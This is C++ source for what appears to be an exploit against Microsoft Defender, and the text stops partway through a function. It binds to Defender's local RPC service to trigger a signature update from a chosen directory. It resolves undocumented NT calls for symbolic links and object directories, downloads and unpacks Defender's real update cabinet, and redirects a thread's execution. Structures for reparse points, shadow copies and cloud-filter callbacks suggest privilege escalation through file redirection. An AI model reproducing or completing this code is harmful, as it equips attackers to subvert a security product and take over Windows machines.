
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <wininet.h>
#include <string.h>
#include <fdi.h>
#include <fcntl.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <ktmw32.h>
#include <wuapi.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <aclapi.h>
#include "windefend_h.h"

/*
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/provider.h>
#include <openssl/hmac.h>
*/
#include "offreg.h"
#define _NTDEF_
#include <ntsecapi.h>
#include <sddl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Cabinet.lib")
#pragma comment(lib, "Wuguid.lib")
#pragma comment(lib,"CldApi.lib")

//////////////////////////////////////////////////////////////////////
// Logging infrastructure
/////////////////////////////////////////////////////////////////////

static void LogTimestamp()
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	printf("[%04d-%02d-%02d %02d:%02d:%02d.%03d] ",
		st.wYear, st.wMonth, st.wDay,
		st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}

static const char* WinErrToStr(DWORD err, char* buf, DWORD bufsz)
{
	DWORD n = FormatMessageA(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, err, MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT),
		buf, bufsz, NULL);
	if (n > 0) {
		while (n > 0 && (buf[n - 1] == '\r' || buf[n - 1] == '\n'))
			buf[--n] = '\0';
	}
	else {
		sprintf(buf, "(no description)");
	}
	return buf;
}

static const char* HrToStr(HRESULT hr, char* buf, DWORD bufsz)
{
	return WinErrToStr((DWORD)hr, buf, bufsz);
}

static const char* NtStatusToStr(NTSTATUS st, char* buf, DWORD bufsz)
{
	return WinErrToStr(RtlNtStatusToDosError(st), buf, bufsz);
}

#define LOG(fmt, ...) do { LogTimestamp(); printf(fmt, ##__VA_ARGS__); } while(0)
#define LOG_ERR(tag, fmt, ...) do { \
	DWORD _le = GetLastError(); \
	char _eb[512]; \
	WinErrToStr(_le, _eb, sizeof(_eb)); \
	LogTimestamp(); \
	printf("[ERROR][%s] " fmt " | win32=%d (0x%08X) \"%s\"\n", \
		tag, ##__VA_ARGS__, _le, _le, _eb); \
} while(0)

#define LOG_HR(tag, hr, fmt, ...) do { \
	char _eb[512]; \
	HrToStr(hr, _eb, sizeof(_eb)); \
	LogTimestamp(); \
	printf("[ERROR][%s] " fmt " | hr=0x%08X \"%s\"\n", \
		tag, ##__VA_ARGS__, (unsigned int)(hr), _eb); \
} while(0)

#define LOG_NT(tag, st, fmt, ...) do { \
	char _eb[512]; \
	NtStatusToStr(st, _eb, sizeof(_eb)); \
	LogTimestamp(); \
	printf("[ERROR][%s] " fmt " | ntstatus=0x%08X \"%s\"\n", \
		tag, ##__VA_ARGS__, (unsigned int)(st), _eb); \
} while(0)

#define LOG_OK(tag, fmt, ...) do { LogTimestamp(); printf("[OK][%s] " fmt "\n", tag, ##__VA_ARGS__); } while(0)
#define LOG_INFO(tag, fmt, ...) do { LogTimestamp(); printf("[INFO][%s] " fmt "\n", tag, ##__VA_ARGS__); } while(0)
#define LOG_WARN(tag, fmt, ...) do { LogTimestamp(); printf("[WARN][%s] " fmt "\n", tag, ##__VA_ARGS__); } while(0)

//////////////////////////////////////////////////////////////////////
// Proxy detection
/////////////////////////////////////////////////////////////////////

struct ProxyConfig {
	bool useProxy;
	bool autoDetect;
	wchar_t proxyServer[512];
	wchar_t proxyBypass[512];
};

static ProxyConfig DetectSystemProxy()
{
	ProxyConfig cfg = { false, false, {0}, {0} };

	INTERNET_PER_CONN_OPTION_LIST optionList = { 0 };
	INTERNET_PER_CONN_OPTION options[3] = { 0 };
	DWORD listSz = sizeof(optionList);

	options[0].dwOption = INTERNET_PER_CONN_FLAGS;
	options[1].dwOption = INTERNET_PER_CONN_PROXY_SERVER;
	options[2].dwOption = INTERNET_PER_CONN_PROXY_BYPASS;
	optionList.dwSize = sizeof(optionList);
	optionList.pszConnection = NULL;
	optionList.dwOptionCount = 3;
	optionList.pOptions = options;

	if (InternetQueryOption(NULL, INTERNET_OPTION_PER_CONNECTION_OPTION, &optionList, &listSz)) {
		DWORD flags = options[0].Value.dwValue;
		LOG_INFO("PROXY", "InternetQueryOption flags=0x%08X", flags);

		if ((flags & PROXY_TYPE_PROXY) && options[1].Value.pszValue && options[1].Value.pszValue[0]) {
			wcsncpy(cfg.proxyServer, options[1].Value.pszValue, 511);
			cfg.useProxy = true;
		}
		if (options[2].Value.pszValue && options[2].Value.pszValue[0]) {
			wcsncpy(cfg.proxyBypass, options[2].Value.pszValue, 511);
		}
		if (flags & PROXY_TYPE_AUTO_DETECT) {
			cfg.autoDetect = true;
		}
		if (flags & PROXY_TYPE_AUTO_PROXY_URL) {
			LOG_INFO("PROXY", "PAC URL configured, will use PRECONFIG");
			cfg.autoDetect = true;
		}

		if (options[1].Value.pszValue) GlobalFree(options[1].Value.pszValue);
		if (options[2].Value.pszValue) GlobalFree(options[2].Value.pszValue);
	}
	else {
		LOG_WARN("PROXY", "InternetQueryOption(PER_CONNECTION_OPTION) failed, error=%d", GetLastError());
	}

	if (cfg.useProxy) {
		LOG_INFO("PROXY", "System proxy detected: %ws", cfg.proxyServer);
		if (cfg.proxyBypass[0])
			LOG_INFO("PROXY", "Proxy bypass list: %ws", cfg.proxyBypass);
	}
	else if (cfg.autoDetect) {
		LOG_INFO("PROXY", "Auto-detect/PAC configured, will use INTERNET_OPEN_TYPE_PRECONFIG");
	}
	else {
		LOG_INFO("PROXY", "No system proxy detected, using direct connection");
	}

	return cfg;
}

static HINTERNET OpenInternetWithProxy(const wchar_t* userAgent)
{
	ProxyConfig cfg = DetectSystemProxy();

	HINTERNET h = NULL;

	if (cfg.useProxy) {
		LOG_INFO("NET", "InternetOpen: using explicit proxy %ws", cfg.proxyServer);
		h = InternetOpen(userAgent, INTERNET_OPEN_TYPE_PROXY,
			cfg.proxyServer,
			cfg.proxyBypass[0] ? cfg.proxyBypass : NULL,
			NULL);
	}
	else if (cfg.autoDetect) {
		LOG_INFO("NET", "InternetOpen: using PRECONFIG (system auto-detect/PAC)");
		h = InternetOpen(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	}
	else {
		LOG_INFO("NET", "InternetOpen: using DIRECT connection");
		h = InternetOpen(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	}

	if (h) {
		DWORD timeout = 30000;
		InternetSetOption(h, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
		InternetSetOption(h, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
		InternetSetOption(h, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
		LOG_INFO("NET", "Timeouts set to %d ms", timeout);
	}

	return h;
}
//////////////////////////////////////////////////////////////////////
// Logging + proxy infrastructure end
/////////////////////////////////////////////////////////////////////


/// NT routines and definitions
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = (NTSTATUS(WINAPI*)(
		PHANDLE            DirectoryHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes
		))GetProcAddress(hm, "NtOpenDirectoryObject");;
NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
	HANDLE  DirectoryHandle,
	PVOID   Buffer,
	ULONG   Length,
	BOOLEAN ReturnSingleEntry,
	BOOLEAN RestartScan,
	PULONG  Context,
	PULONG  ReturnLength
	) = (NTSTATUS(WINAPI*)(
		HANDLE  DirectoryHandle,
		PVOID   Buffer,
		ULONG   Length,
		BOOLEAN ReturnSingleEntry,
		BOOLEAN RestartScan,
		PULONG  Context,
		PULONG  ReturnLength
		))GetProcAddress(hm, "NtQueryDirectoryObject");
NTSTATUS(WINAPI* _NtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	) = (NTSTATUS(WINAPI*)(
		HANDLE                 FileHandle,
		PIO_STATUS_BLOCK       IoStatusBlock,
		PVOID                  FileInformation,
		ULONG                  Length,
		FILE_INFORMATION_CLASS FileInformationClass
		))GetProcAddress(hm, "NtSetInformationFile");

NTSTATUS(WINAPI* _NtCreateDirectoryObjectEx)(
	OUT PHANDLE             DirectoryHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN HANDLE ShadowDirectoryHandle,
	IN ULONG Flags) =
	(NTSTATUS(WINAPI*)(
		OUT PHANDLE             DirectoryHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN HANDLE ShadowDirectoryHandle,
		IN ULONG Flags))GetProcAddress(hm,"NtCreateDirectoryObjectEx");

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
	ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

//////////////// NT DEF END


// definitions of structures used by threads that invoke WD RPC calls
struct WDRPCWorkerThreadArgs
{
	HANDLE hntfythread;
	HANDLE hevent;
	RPC_STATUS res;
	wchar_t* dirpath;
};

typedef struct tagMPCOMPONENT_VERSION {
	ULONGLONG      Version;
	ULARGE_INTEGER UpdateTime;
} MPCOMPONENT_VERSION, * PMPCOMPONENT_VERSION;

typedef struct tagMPVERSION_INFO {
	MPCOMPONENT_VERSION Product;
	MPCOMPONENT_VERSION Service;
	MPCOMPONENT_VERSION FileSystemFilter;
	MPCOMPONENT_VERSION Engine;
	MPCOMPONENT_VERSION ASSignature;
	MPCOMPONENT_VERSION AVSignature;
	MPCOMPONENT_VERSION NISEngine;
	MPCOMPONENT_VERSION NISSignature;
	MPCOMPONENT_VERSION Reserved[4];
} MPVERSION_INFO, * PMPVERSION_INFO;

typedef union Version {
	struct {
		WORD major;
		WORD minor;
		WORD build;
		WORD revision;
	};
	ULONGLONG QuadPart;
};
//////////////////


// structures and global vars used by definition update functions
void* cabbuff2 = NULL;
DWORD cabbuffsz = 0;
struct CabOpArguments {
	ULONG index;
	char* filename;
	size_t ptroffset;
	char* buff;
	DWORD FileSize;
	CabOpArguments* first;
	CabOpArguments* next;
};

struct UpdateFiles {
	char filename[MAX_PATH];
	void* filebuff;
	DWORD filesz;
	bool filecreated;
	HANDLE hsymlink;
	UpdateFiles* next;
};
///////////////////////////////////////


// structures and global vars used by volume shadow copy functions
struct cldcallbackctx {

	HANDLE hnotifywdaccess;
	HANDLE hnotifylockcreated;
	wchar_t filename[MAX_PATH];
};

struct LLShadowVolumeNames
{
	wchar_t* name;
	LLShadowVolumeNames* next;
};

struct cloudworkerthreadargs {
	HANDLE hlock;
	HANDLE hcleanupevent;
	HANDLE hvssready;
};
///////////////////////////////////////



//////////////////////////////////////////////////////////////////////
// Functions required by RPC
/////////////////////////////////////////////////////////////////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
//////////////////////////////////////////////////////////////////////
// Functions required by RPC end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD RPC functions
/////////////////////////////////////////////////////////////////////
void ThrowFunc()
{
	throw 0;
}

void RaiseExceptionInThread(HANDLE hthread)
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	SuspendThread(hthread);

	if (GetThreadContext(hthread, &ctx))
	{
		ctx.Rip = (DWORD64)ThrowFunc;
		SetThreadContext(hthread, &ctx);
		ResumeThread(hthread);
	}
}

void CallWD(WDRPCWorkerThreadArgs* args)
{
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding;
	LOG_INFO("RPC", "Composing RPC binding string for WD UUID %ws", (wchar_t*)MS_WD_UUID);
	RPC_STATUS rpcstat = RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding);
	if (rpcstat != RPC_S_OK)
	{
		LOG("[ERROR][RPC] RpcStringBindingComposeW failed, RPC_STATUS=0x%08X\n", rpcstat);
		RaiseExceptionInThread(args->hntfythread);
		return;
	}
	LOG_OK("RPC", "Binding string composed: %ws", (wchar_t*)StringBinding);
	RPC_BINDING_HANDLE bindhandle = 0;
	rpcstat = RpcBindingFromStringBindingW(StringBinding, &bindhandle);
	if (rpcstat != RPC_S_OK)
	{
		LOG("[ERROR][RPC] RpcBindingFromStringBindingW failed, RPC_STATUS=0x%08X\n", rpcstat);
		RaiseExceptionInThread(args->hntfythread);
		return;
	}
	LOG_OK("RPC", "Bound to WD ALPC port, handle=0x%p", (void*)bindhandle);
	error_status_t errstat = 0;
	LOG_INFO("RPC", "Calling Proc42_ServerMpUpdateEngineSignature, dirpath=%ws", args->dirpath);
	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	LOG_INFO("RPC", "Proc42 returned: RPC_STATUS=0x%08X, error_status_t=0x%08X", stat, errstat);
	args->res = stat;
	if (args->hevent)
		SetEvent(args->hevent);

}

DWORD WINAPI WDCallerThread(void* args)
{
	if (!args)
		return ERROR_BAD_ARGUMENTS;
	CallWD((WDRPCWorkerThreadArgs*)args);
	return ERROR_SUCCESS;

}
//////////////////////////////////////////////////////////////////////
// WD RPC functions end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD definition update functions
/////////////////////////////////////////////////////////////////////

CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{

	CabOpArguments* cbps = (CabOpArguments*)malloc(sizeof(CabOpArguments));
	ZeroMemory(cbps, sizeof(CabOpArguments));
	cbps->buff = (char*)cabbuff2;
	cbps->FileSize = cabbuffsz;
	return cbps;
}

INT CUST_FNSEEK(HANDLE hf,
	long offset,
	int origin)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (origin == SEEK_SET)
			CabOpArgs->ptroffset = offset;
		if (origin == SEEK_CUR)
			CabOpArgs->ptroffset += offset;
		if (origin == SEEK_END)
			CabOpArgs->ptroffset += CabOpArgs->FileSize;

		return CabOpArgs->ptroffset;

	}

	return -1;
}


UINT CUST_FNREAD(CabOpArguments* hf,
	void* const buffer,
	unsigned const buffer_size)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (CabOpArgs->buff)
		{

			memmove(buffer, &CabOpArgs->buff[CabOpArgs->ptroffset], buffer_size);
			CabOpArgs->ptroffset += buffer_size;
			//CabOpArgs->ReadBytes += buffer_size;
			return buffer_size;
		}
	}

	return NULL;
}

UINT CUST_FNWRITE(CabOpArguments* hf,
	const void* buffer,
	unsigned int count)
{

	if (hf)
	{
		if (hf->buff) {
			memmove(&hf->buff[hf->ptroffset], buffer, count);
			hf->ptroffset += count;
			return count;
		}
	}


	return NULL;
}

INT CUST_FNCLOSE(CabOpArguments* fnFileClose)
{

	free(fnFileClose);
	return 0;
}

VOID* CUST_FNALLOC(size_t cb)
{
	return malloc(cb);
}

VOID CUST_FNFREE(void* buff)
{
	free(buff);
}

INT_PTR CUST_FNFDINOTIFY(
	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
) {

	//printf("_FNFDINOTIFY : %d\n", fdinotify);
	wchar_t newfile[MAX_PATH] = { 0 };
	wchar_t filename[MAX_PATH] = { 0 };
	HANDLE hfile = NULL;
	ULONG rethandle = 0;
	CabOpArguments** ptr = NULL;
	CabOpArguments* lcab = NULL;
	switch (fdinotify)
	{
	case fdintCOPY_FILE:
		if (_stricmp(pfdin->psz1, "MpSigStub.exe") == 0)
			return NULL;

		ptr = (CabOpArguments**)pfdin->pv;
		lcab = *ptr;
		if (lcab == NULL) {
			lcab = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab, sizeof(CabOpArguments));
			lcab->first = lcab;
			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);
		}
		else
		{
			lcab->next = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab->next, sizeof(CabOpArguments));
			lcab->next->first = lcab->first;
			lcab = lcab->next;

			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);
		}

		lcab->first->index++;
		*ptr = lcab;



		return (INT_PTR)lcab;
		break;
	case fdintCLOSE_FILE_INFO:
		return TRUE;
		break;
	default:
		return 0;
	}
	return 0;
}

void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
	if (cbRawData < sizeof(IMAGE_DOS_HEADER))
	{
		return 0;
	}

	if (pvRawData->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return 0;
	}

	ULONG e_lfanew = pvRawData->e_lfanew, s = e_lfanew + sizeof(IMAGE_NT_HEADERS);

	if (e_lfanew >= s || s > cbRawData)
	{
		return 0;
	}

	PIMAGE_NT_HEADERS pinth = (PIMAGE_NT_HEADERS)RtlOffsetToPointer(pvRawData, e_lfanew);



	if (pinth->Signature != IMAGE_NT_SIGNATURE)
	{
		return 0;
	}

	ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage, SizeOfHeaders = pinth->OptionalHeader.SizeOfHeaders;

	s = e_lfanew + SizeOfHeaders;

	if (SizeOfHeaders > SizeOfImage || SizeOfHeaders >= s || s > cbRawData)
	{
		return 0;
	}

	s = FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + pinth->FileHeader.SizeOfOptionalHeader;

	if (s > SizeOfHeaders)
	{
		return 0;
	}

	ULONG NumberOfSections = pinth->FileHeader.NumberOfSections;

	PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)RtlOffsetToPointer(pinth, s);

	ULONG Size;

	if (NumberOfSections)
	{
		if (e_lfanew + s + NumberOfSections * sizeof(IMAGE_SECTION_HEADER) > SizeOfHeaders)
		{
			return 0;
		}

		do
		{
			if (Size = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				union {
					ULONG VirtualAddress, PointerToRawData;
				};

				VirtualAddress = pish->VirtualAddress, s = VirtualAddress + Size;

				if (VirtualAddress > s || s > SizeOfImage)
				{
					return 0;
				}

				PointerToRawData = pish->PointerToRawData, s = PointerToRawData + Size;

				if (PointerToRawData > s || s > cbRawData)
				{
					return 0;
				}

				char rsrc[] = ".rsrc";
				if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
				{
					typedef struct _IMAGE_RESOURCE_DIRECTORY2 {
						DWORD   Characteristics;
						DWORD   TimeDateStamp;
						WORD    MajorVersion;
						WORD    MinorVersion;
						WORD    NumberOfNamedEntries;
						WORD    NumberOfIdEntries;
						IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];
					} IMAGE_RESOURCE_DIRECTORY2, * PIMAGE_RESOURCE_DIRECTORY2;

					PIMAGE_RESOURCE_DIRECTORY2 pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(pvRawData, pish->PointerToRawData);

					PIMAGE_RESOURCE_DIRECTORY2 prsrc = pird;
					PIMAGE_RESOURCE_DIRECTORY_ENTRY pirde = { 0 };
					PIMAGE_RESOURCE_DATA_ENTRY pdata = 0;

					while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries)
					{




						pirde = &pird->DirectoryEntries[0];
						if (!pirde->DataIsDirectory)
						{
							pdata = (PIMAGE_RESOURCE_DATA_ENTRY)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
							pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
							void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
							if (cabsz)
								*cabsz = pdata->Size;
							return cabfile;
						}
						pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
					}
					break;




				}



			}

		} while (pish++, --NumberOfSections);
	}
	return NULL;

}


UpdateFiles* GetUpdateFiles(int* filecount = NULL)
{



	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	char fname[] = "update.cab";
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	bool extractres = false;
	DWORD totalsz = 0;
	HANDLE hmpeng = NULL;
	CabOpArguments* CabOpArgs = NULL;
	CabOpArguments* mpenginedata = NULL;
	void* dllview = NULL;
	char** filesmtrx = 0;
	UpdateFiles* firstupdt = NULL;
	UpdateFiles* current = NULL;

	DWORD nbytes = 0;


	LOG_INFO("DL", "Starting update download...");
	hint = OpenInternetWithProxy(L"Chrome/141.0.0.0");
	if (!hint)
	{
		LOG_ERR("DL", "InternetOpen/OpenInternetWithProxy failed");
		goto cleanup;
	}
	LOG_OK("DL", "InternetOpen succeeded, handle=0x%p", (void*)hint);

	{
		const wchar_t* updateUrl = L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64";
		LOG_INFO("DL", "Opening URL: %ws", updateUrl);
		hint2 = InternetOpenUrl(hint, updateUrl, NULL, NULL, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
	}
	if (!hint2)
	{
		LOG_ERR("DL", "InternetOpenUrl failed");
		goto cleanup;
	}
	LOG_OK("DL", "URL opened, handle=0x%p", (void*)hint2);

	{
		char statusCode[32] = { 0 };
		DWORD statusSz = sizeof(statusCode);
		DWORD statusIdx = 0;
		if (HttpQueryInfoA(hint2, HTTP_QUERY_STATUS_CODE, statusCode, &statusSz, &statusIdx))
			LOG_INFO("DL", "HTTP status code: %s", statusCode);
		else
			LOG_WARN("DL", "Could not query HTTP status code, error: %d", GetLastError());

		char contentType[256] = { 0 };
		DWORD ctSz = sizeof(contentType);
		DWORD ctIdx = 0;
		if (HttpQueryInfoA(hint2, HTTP_QUERY_CONTENT_TYPE, contentType, &ctSz, &ctIdx))
			LOG_INFO("DL", "Content-Type: %s", contentType);

		char finalUrl[2048] = { 0 };
		DWORD fuSz = sizeof(finalUrl);
		if (InternetQueryOptionA(hint2, INTERNET_OPTION_URL, finalUrl, &fuSz))
			LOG_INFO("DL", "Final URL (after redirects): %s", finalUrl);
	}

	res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
	if (!res2)
	{
		LOG_ERR("DL", "HttpQueryInfo(CONTENT_LENGTH) failed");
		goto cleanup;
	}


	wcscpy(filesz, (LPWSTR)data);
	sz = _wtoi(filesz);
	li.QuadPart = sz;
	LOG_INFO("DL", "Content-Length: %d bytes (%.2f MB)", sz, (double)sz / (1024.0 * 1024.0));


	exebuff = malloc(sz);
	if (!exebuff)
	{
		LOG_ERR("DL", "malloc(%d) failed for download buffer", sz);
		goto cleanup;
	}
	ZeroMemory(exebuff, sz);

	LOG_INFO("DL", "Downloading %d bytes...", sz);
	{
		DWORD totalRead = 0;
		DWORD chunkRead = 0;
		DWORD lastPercent = 0;
		bool dlOk = true;
		while (totalRead < sz) {
			DWORD toRead = min(sz - totalRead, 65536u);
			if (!InternetReadFile(hint2, (char*)exebuff + totalRead, toRead, &chunkRead)) {
				LOG_ERR("DL", "InternetReadFile failed at offset %d/%d", totalRead, sz);
				dlOk = false;
				break;
			}
			if (chunkRead == 0) {
				LOG_WARN("DL", "InternetReadFile returned 0 bytes at offset %d/%d (connection closed?)", totalRead, sz);
				break;
			}
			totalRead += chunkRead;
			DWORD pct = (totalRead * 100) / sz;
			if (pct >= lastPercent + 10) {
				LOG_INFO("DL", "Progress: %d/%d bytes (%d%%)", totalRead, sz, pct);
				lastPercent = pct;
			}
		}
		readsz = totalRead;
		if (!dlOk || readsz != sz) {
			LOG_ERR("DL", "Download incomplete: got %d of %d bytes", readsz, sz);
			goto cleanup;
		}
	}
	LOG_OK("DL", "Download complete: %d bytes", readsz);
	InternetCloseHandle(hint);
	hint = NULL;
	InternetCloseHandle(hint2);
	hint2 = NULL;
	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);



	if (!mappedbuff)
	{
		LOG_ERR("DL", "GetCabFileFromBuff returned NULL - PE/.rsrc parsing failed, downloaded file may be corrupt");
		goto cleanup;
	}
	LOG_OK("DL", "Cabinet extracted from PE .rsrc: addr=0x%p, size=%d bytes", mappedbuff, ressz);




	cabbuff2 = mappedbuff;
	cabbuffsz = ressz;

	LOG_INFO("CAB", "Creating FDI context for in-memory cab extraction...");
	hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE, (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
	if (!hcabctx)
	{
		LOG("[ERROR][CAB] FDICreate failed: erfOper=0x%x, erfType=0x%x, fError=%d\n", erfstruct.erfOper, erfstruct.erfType, erfstruct.fError);
		goto cleanup;
	}
	LOG_OK("CAB", "FDI context created");



	LOG_INFO("CAB", "FDICopy: extracting cabinet...");
	extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
	if (!extractres)
	{
		LOG("[ERROR][CAB] FDICopy failed: erfOper=0x%x, erfType=0x%x, fError=%d\n", erfstruct.erfOper, erfstruct.erfType, erfstruct.fError);
		goto cleanup;
	}
	LOG_OK("CAB", "FDICopy succeeded");
	FDIDestroy(hcabctx);
	hcabctx = NULL;

	if (!CabOpArgs)
	{
		LOG_ERR("CAB", "CabOpArgs is NULL after extraction — cab may be empty");
		return NULL;
	}

	CabOpArgs = CabOpArgs->first;

	firstupdt = (UpdateFiles*)malloc(sizeof(UpdateFiles));
	ZeroMemory(firstupdt, sizeof(UpdateFiles));
	current = firstupdt;
	while (CabOpArgs)
	{
		if (filecount)
			*filecount += 1;
		strcpy(current->filename, CabOpArgs->filename);
